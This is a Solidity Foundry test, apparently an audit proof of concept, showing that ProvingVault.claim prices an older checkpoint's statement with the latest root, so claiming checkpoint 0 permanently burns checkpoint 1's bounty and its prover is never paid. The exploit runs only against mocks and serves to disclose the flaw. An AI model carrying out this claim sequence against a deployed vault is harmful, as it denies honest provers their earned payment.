// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";

import {ProvingVault} from "src/vault/ProvingVault.sol";
import {IProvingVault} from "interfaces/vault/IProvingVault.sol";
import {IInstanceRegistry} from "interfaces/registry/IInstanceRegistry.sol";
import {InstanceRegistry} from "src/registry/InstanceRegistry.sol";
import {MerkleSnapshot} from "src/merkle/MerkleSnapshot.sol";
import {TestUSDC} from "src/tokens/TestUSDC.sol";
import {MockZkVerifier} from "../mocks/MockZkVerifier.sol";
import {MockAccumulator} from "../mocks/MockAccumulator.sol";
import {MockEthUsdFeed} from "../mocks/MockEthUsdFeed.sol";

/// @notice PoC: `ProvingVault.claim` prices an OLD checkpoint's statement with the CURRENT latest
///         root. On any instance whose (leafCount, anchorCount) pair is constant across
///         checkpoints -- which is exactly the shape of every `trust-compose` instance, whose
///         accumulator reports `leafCount = policy source count` and which has no lane-2 registry
///         at all -- the statement computed for checkpoint k is byte-identical to the statement
///         of the latest checkpoint j. Claiming k therefore burns j's `_paidStatement` slot and
///         j's prover can never be paid.
contract PashovEcon_VaultStatementCollision is Test {
    ProvingVault vault;
    InstanceRegistry registry;
    MerkleSnapshot snapshot;
    MockAccumulator accer;
    MockZkVerifier verifier;
    MockEthUsdFeed feed;
    TestUSDC usdc;

    bytes32 constant INSTANCE = keccak256("composed-net");
    bytes32 constant PROGRAM = keccak256("trust-compose"); // flat band 3
    bytes32 constant PARAMS = keccak256("params-v1");

    address constitutional = address(0xC047);
    address operational = address(0x0BE7);
    address feeSetter = address(0xFEE5);
    address admin = address(0xAD41);
    address proverOne = address(0xF1F1);
    address proverTwo = address(0xF2F2);

    function setUp() public {
        verifier = new MockZkVerifier();
        accer = new MockAccumulator();
        snapshot = new MerkleSnapshot(verifier, PARAMS, accer, constitutional, operational);
        registry = new InstanceRegistry(address(this));
        usdc = new TestUSDC();
        feed = new MockEthUsdFeed();
        vault = new ProvingVault(registry, usdc, feed, 1 hours, 100e8, 100_000e8, feeSetter, admin);

        registry.register(
            INSTANCE,
            IInstanceRegistry.Instance({
                program: PROGRAM,
                snapshot: address(snapshot),
                verifier: address(verifier),
                registryOrAccumulator: address(accer),
                paramsHash: PARAMS
            })
        );

        uint256 usdScale = vault.USD();
        vm.prank(feeSetter);
        vault.setFeePerRootUsd(PROGRAM, 3, 15 * usdScale); // $15 per composed root

        vm.warp(1_000_000);
        vm.fee(10 gwei);
        feed.set(3_000e8, block.timestamp);

        // Community funds the tank and enables payment with NO cadence restriction.
        vm.deal(address(this), 100 ether);
        vault.depositETH{value: 10 ether}(INSTANCE);
        uint96 cap = uint96(1_000 * usdScale);
        vm.prank(constitutional);
        vault.setPolicy(INSTANCE, 0, cap);
    }

    /// Three composition sources => `leafCount == 3` on EVERY checkpoint; no anchor registry =>
    /// `anchorCount == 0` on EVERY checkpoint. Only `acc` (the sha256 of the capture manifest)
    /// moves, which is what `trigger()`'s freshness guard actually checks.
    function _mint(bytes32 acc, uint64 blockNumber) internal returns (uint256 id) {
        accer.setState(acc, 3);
        vm.roll(blockNumber);
        id = snapshot.trigger();
    }

    function _submit(uint256 id, bytes32 root, address recipient) internal {
        snapshot.submitProof(id, root, bytes32(uint256(0x1F5)), "cid", 1_000 ether, bytes32(0), recipient, hex"");
    }

    function test_ClaimingAnOlderCheckpointPermanentlyBurnsTheLatestCheckpointsBounty() public {
        bytes32 R0 = keccak256("root-0");
        bytes32 R1 = keccak256("root-1");

        // Prover 1 proves checkpoint 0 directly (the operator daemon path: no vault call).
        uint256 c0 = _mint(keccak256("capture-0"), 100);
        _submit(c0, R0, proverOne);

        // Prover 2 proves checkpoint 1 directly. Latest state root is now R1.
        uint256 c1 = _mint(keccak256("capture-1"), 200);
        _submit(c1, R1, proverTwo);
        assertEq(snapshot.getLatestState().root, R1);

        // Sanity: the two checkpoints agree on both size counters, which is the precondition.
        assertEq(snapshot.accumulator().getCheckpoint(c0).leafCount, 3);
        assertEq(snapshot.accumulator().getCheckpoint(c1).leafCount, 3);
        (, uint64 ac0) = snapshot.anchorCheckpoints(c0);
        (, uint64 ac1) = snapshot.anchorCheckpoints(c1);
        assertEq(ac0, 0);
        assertEq(ac1, 0);

        // Anyone settles the OLDER checkpoint. `_terms` uses `getLatestState().root` = R1, so the
        // statement written is the one that belongs to checkpoint 1.
        uint256 paidToOne = vault.claim(INSTANCE, c0);
        assertEq(paidToOne, 15 * vault.USD(), "checkpoint 0 paid");

        bytes32 burned = keccak256(abi.encode(address(snapshot), uint64(3), uint64(0), R1));
        console2.log("statement burned by claim(0):");
        console2.logBytes32(burned);

        // Checkpoint 1's own bounty is now permanently unclaimable.
        vm.expectRevert(abi.encodeWithSelector(IProvingVault.StatementAlreadyPaid.selector, burned));
        vault.claim(INSTANCE, c1);

        // ...and it stays unclaimable forever: nothing can clear `_paidStatement`.
        vm.roll(block.number + 100_000);
        vm.warp(block.timestamp + 30 days);
        feed.set(3_000e8, block.timestamp);
        vm.expectRevert(abi.encodeWithSelector(IProvingVault.StatementAlreadyPaid.selector, burned));
        vault.claim(INSTANCE, c1);

        assertEq(vault.creditOf(proverTwo, address(0)), 0, "prover 2 never paid for a real proof");
        assertFalse(vault.isClaimed(INSTANCE, c1), "and the checkpoint is not even marked claimed");
    }
}
